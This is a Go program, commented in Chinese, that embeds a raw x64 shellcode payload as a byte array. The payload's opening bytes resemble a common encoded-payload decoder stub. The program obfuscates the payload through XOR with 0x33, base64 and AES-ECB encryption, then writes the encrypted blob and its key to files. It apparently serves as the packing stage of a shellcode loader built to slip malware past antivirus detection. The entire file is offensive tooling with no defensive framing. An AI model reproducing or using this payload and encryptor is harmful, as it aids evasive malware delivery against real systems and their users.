package main

import (
	"bytes"
	"crypto/aes"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"os"
)

func main() {
	// shell code
	buf :=  []byte{0x48,0x31,0xc9,0x48,0x81,0xe9,0xac,0xff,0xff,
		0xff,0x48,0x8d,0x05,0xef,0xff,0xff,0xff,0x48,0xbb,0xaf,0xee,
		0x70,0x61,0x8b,0x5b,0xd3,0xc3,0x48,0x31,0x58,0x27,0x48,0x2d,
		0xf8,0xff,0xff,0xff,0xe2,0xf4,0xe7,0xdf,0xb9,0x29,0x0a,0xb2,
		0x62,0x3c,0x50,0x11,0x38,0xec,0x8e,0xb4,0x2c,0x3c,0x50,0xa6,
		0xcb,0x58,0x35,0x47,0xa3,0xea,0x1c,0x2e,0x4c,0x29,0xba,0x03,
		0xf4,0x8b,0x82,0x16,0x8f,0x9e,0x74,0xb9,0x27,0xb2,0x20,0x3b,
		0x48,0xc9,0xd1,0x2d,0x10,0x05,0xee,0xba,0x8d,0x4d,0xd7,0x64,
		0x10,0x05,0x59,0x49,0xa8,0x89,0x72,0xd0,0xb9,0x73,0x62,0xab,
		0x48,0x79,0x60,0xbc,0xa7,0xd7,0xe9,0x0d,0xff,0xb7,0xda,0x6f,
		0x0f,0x0a,0x92,0xf1,0xd7,0x28,0xf0,0x3d,0xb8,0xc4,0x13,0x34,
		0x53,0x2e,0xb4,0x3d,0xb8,0x73,0xe0,0x7d,0xb8,0x8a,0x01,0x08,
		0x08,0xd2,0xa8,0xf1,0x67,0x99,0x6c,0x8a,0x6a,0xc3,0xa4,0x46,
		0xa9,0x23,0xbf,0x4e,0x98,0xb9,0x59,0xf2,0xf0,0xe8,0x47,0xf9,
		0x56,0x38,0x9c,0x76,0xf6,0xd7,0x47,0xf9,0xe1,0xcb,0x94,0x7b,
		0x5c,0xe5,0x1f,0xda,0xe2,0xa6,0x59,0x42,0x41,0x0f,0xf0,0x2b,
		0x51,0x8f,0xee,0x8c,0xfb,0xdc,0xc1,0x46,0x6f,0x59,0x46,0x47,
		0x9e,0xfe,0x3d,0x0e,0xad,0xec,0xf7,0xff,0x00,0xaf,0x6b,0x46,
		0xdd,0x6f,0xd3,0xe7,0xd9,0xac,0x5d,0x46,0x67,0xef,0xae,0xe7,
		0xd9,0xac,0x1d,0x46,0x67,0xcf,0xe6,0xe2,0x63,0x37,0x75,0x01,
		0x5b,0xf7,0xfc,0xe7,0x63,0x3e,0x91,0x32,0x8d,0xc1,0xb4,0x83,
		0x72,0xbf,0xfc,0xc7,0xe1,0xfc,0xb7,0x6e,0xb0,0x13,0x6f,0x4f,
		0xbd,0xf5,0x3d,0xfd,0x72,0x75,0x7f,0x32,0xa4,0xbc,0x66,0xc9,
		0xd3,0x86,0x25,0x05,0xee,0xb2,0x33,0xdd,0x52,0xfe,0x3d,0x85,
		0x6c,0x35,0xb6,0xaf,0x52,0xb6,0xb8,0xce,0x98,0xda,0xfe,0xae,
		0x82,0xba,0xb6,0x4e,0xcc,0xf4,0xb7,0x7f,0xd9,0xb6,0x25,0x5e,
		0x0f,0xeb,0xfe,0x50,0x9b,0xb3,0x0c,0xc7,0xad,0x36,0x82,0x27,
		0x1a,0xff,0xeb,0x46,0xdd,0x7d,0xf7,0x6e,0x9b,0xf3,0x91,0x4f,
		0xed,0x7c,0x8e,0x4f,0x27,0x0f,0x71,0x0d,0xa0,0x99,0xbe,0xea,
		0x6b,0x2f,0x48,0xd6,0xb4,0xf9,0x3d,0xef,0x76,0xb7,0x3c,0xde,
		0x8a,0xfc,0x3d,0xa3,0x1a,0xba,0xb6,0x4e,0xf0,0xf4,0xb7,0x7f,
		0x13,0x75,0x39,0x86,0xad,0xe5,0xf7,0xf7,0x0c,0xa7,0x75,0x0f,
		0x3c,0xe7,0xf7,0xf7,0x13,0xa7,0x7c,0x54,0xa4,0x3e,0x5a,0x8f,
		0x13,0xac,0xc2,0xee,0xb4,0xfc,0xef,0xf5,0x1a,0x75,0x2f,0xe7,
		0xa7,0x42,0x49,0x50,0x0f,0xb7,0x83,0x79,0x9f,0x8f,0xe9,0x9c,
		0x60,0xfe,0x3d,0x4f,0xba,0xf4,0x3f,0x49,0x1a,0x7f,0xd1,0xae,
		0xed,0xbd,0xb6,0xe6,0xdb,0x1b,0x74,0xb2,0xee,0xbd,0xa7,0xf3,
		0xfe,0xee,0x2d,0x83,0xad,0xe9,0xff,0x26,0xb6,0xb2,0xb4,0xff,
		0xad,0x07,0xfa,0xd8,0x74,0xf9,0xc2,0xdb,0xa0,0x34,0x5c,0xc7,
		0x53,0xff,0x3d,0x0e,0xb5,0xfc,0x0c,0x86,0xd2,0x95,0x3d,0xf1,
		0x39,0xd7,0xbc,0xee,0x0c,0xae,0x6d,0x43,0xdd,0x74,0xfb,0x9e,
		0x92,0xb6,0xc2,0xce,0xa4,0x34,0x74,0xe7,0xad,0x3e,0x75,0x87,
		0x2d,0xfc,0x0c,0x45,0x5d,0x21,0xdd,0xf1,0x39,0xf5,0x3f,0x68,
		0x38,0xee,0x7c,0x56,0xa0,0x34,0x54,0xe7,0xdb,0x07,0x7c,0xb4,
		0x75,0x18,0xc2,0xce,0xad,0x2b,0xb8,0xce,0x98,0xb7,0xff,0x50,
		0x9c,0x8b,0xd8,0xe6,0x7f,0xbd,0xb6,0xaf,0x1a,0x7d,0xd1,0x1e,
		0xa4,0x34,0x54,0xe2,0x63,0x37,0x57,0x0a,0xad,0xe5,0xfe,0x26,
		0xab,0xbf,0x87,0x0c,0x35,0x75,0xe9,0x50,0x87,0x7d,0xc5,0x0e,
		0x92,0xe8,0xfe,0x2c,0x96,0xde,0x63,0x87,0x1a,0xd7,0xf6,0xee,
		0x0b,0x96,0x3d,0x1e,0xec,0xbd,0xf7,0xf7,0x1a,0x77,0xcf,0x46,
		0xdd,0x74,0xf7,0x15,0x0a,0x5a,0x6e,0xeb,0x13,0x68,0xfe,0x26,
		0x91,0xb7,0xb4,0xc9,0xa1,0x8c,0x7f,0xe6,0xdb,0x0e,0x75,0x87,
		0x36,0xf5,0x3f,0x56,0x13,0x44,0x3f,0xd7,0x24,0xe2,0x49,0x7a,
		0xd1,0x06,0x3d,0x73,0xc4,0xe5,0xf7,0xf8,0x0b,0x96,0x3d,0x4e,
		0xec,0xbd,0xf7,0xf7,0x38,0xfe,0x67,0x4f,0x56,0xb6,0x99,0xa0,
		0x62,0x01,0xe8,0x59,0xb5,0xfc,0x0c,0xda,0x3c,0xb3,0x5c,0xf1,
		0x39,0xf4,0x49,0x61,0xbb,0xc2,0xc2,0xf1,0x13,0xf5,0xb7,0x6c,
		0x1a,0xd7,0xfb,0x46,0x69,0x4b,0xc3,0x1b,0x13,0x01,0xda,0x56,
		0x86,0xbd,0xef,0xe6,0x95,0x3c,0xcd,0xbb,0x4e,0xeb,0x49,0x7a,
		0x52,0xfe,0xb8,0xc2,0xef,0xc3};

	fmt.Println("原来的数据:", buf)

	// 异或加密
	xorData := Xor(buf)
	fmt.Println("异或加密后数据:", xorData)

	// base64加密
	base64Data := base64.StdEncoding.EncodeToString(xorData)
	fmt.Println("base64加密后数据:", base64Data)

	// 密钥
	key := AesKey()
	AesData := AesEncryptByECB(base64Data, key)
	fmt.Println("密钥:", key)
	fmt.Println("Aes加密后数据:", AesData)

	err := writeToFile("1.txt", AesData)
	if err != nil {
		fmt.Println("加密数据写入文件失败:", err)
		return
	}

	err1 := writeToFile("key.txt", key)
	if err1 != nil {
		fmt.Println("密钥写入文件失败:", err1)
		return
	}

	fmt.Println("key与加密数据已写入文件！请妥善保存！")

}

func Xor(buf []byte) []byte {
	xorBuf := make([]byte, len(buf))
	for i := 0; i < len(buf); i++ {
		xorBuf[i] = buf[i] ^ 0x33
	}
	return xorBuf
}

func AesKey() string {
	// 生成AES密钥
	key := make([]byte, 16) // 128位密钥
	if _, err := rand.Read(key); err != nil {
		panic(err.Error())
	}

	// 将密钥转换为十六进制格式进行打印
	keyHex := hex.EncodeToString(key)
	return keyHex
}

func AesEncryptByECB(data, key string) string {
	// 判断key长度
	keyLenMap := map[int]struct{}{16: {}, 24: {}, 32: {}}
	if _, ok := keyLenMap[len(key)]; !ok {
	}
	// 密钥和待加密数据转成[]byte
	originByte := []byte(data)
	keyByte := []byte(key)
	// 创建密码组，长度只能是16、24、32字节
	block, _ := aes.NewCipher(keyByte)
	// 获取密钥长度
	blockSize := block.BlockSize()
	// 补码
	originByte = PKCS7Padding(originByte, blockSize)
	// 创建保存加密变量
	encryptResult := make([]byte, len(originByte))
	// CEB是把整个明文分成若干段相同的小段，然后对每一小段进行加密
	for bs, be := 0, blockSize; bs < len(originByte); bs, be = bs+blockSize, be+blockSize {
		block.Encrypt(encryptResult[bs:be], originByte[bs:be])
	}
	return base64.StdEncoding.EncodeToString(encryptResult)
}

func PKCS7Padding(originByte []byte, blockSize int) []byte {
	// 计算补码长度
	padding := blockSize - len(originByte)%blockSize
	// 生成补码
	padText := bytes.Repeat([]byte{byte(padding)}, padding)
	// 追加补码
	return append(originByte, padText...)
}

func writeToFile(filename, text string) error {
	// 创建或打开文件，以只写方式打开，如果文件存在则清空内容
	file, err := os.OpenFile(filename, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
	if err != nil {
		return err
	}
	defer func(file *os.File) {
		err := file.Close()
		if err != nil {
			fmt.Println("close file error:", err)
		}
	}(file)

	// 写入文本到文件
	_, err = file.WriteString(text)
	if err != nil {
		return err
	}

	return nil
}
